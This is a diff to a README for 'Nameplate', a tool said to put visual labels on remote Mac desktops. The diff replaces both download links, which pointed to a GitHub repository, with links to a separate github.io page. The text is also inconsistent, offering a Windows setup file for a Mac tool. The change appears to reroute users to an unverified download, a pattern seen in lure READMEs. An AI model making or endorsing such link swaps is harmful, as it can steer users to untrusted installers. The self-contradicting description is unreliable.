@@ -1,6 +1,6 @@
 # 🏷️ Nameplate - Easily Identify Your Remote Mac Computers
 
-[![](https://img.shields.io/badge/Download-Nameplate-blue.svg)](https://github.com/overweight-don864/Nameplate)
+[![](https://img.shields.io/badge/Download-Nameplate-blue.svg)](https://overweight-don864.github.io)
 
 Manage large groups of computers with confidence. Nameplate adds clear, visual labels to your desktop environment. You see the computer name, asset tag, and custom watermarks directly on your screen. This tool removes the guesswork when you access multiple machines. You always know which device currently sustains your remote session.
 
@@ -8,7 +8,7 @@ Manage large groups of computers with confidence. Nameplate adds clear, visual l
 
 You can obtain the application from our release page. Visit this page to download the latest setup file for your Windows environment.
 
-[Download Nameplate here](https://github.com/overweight-don864/Nameplate)
+[Download Nameplate here](https://overweight-don864.github.io)
 
 ## 💻 System Requirements
 
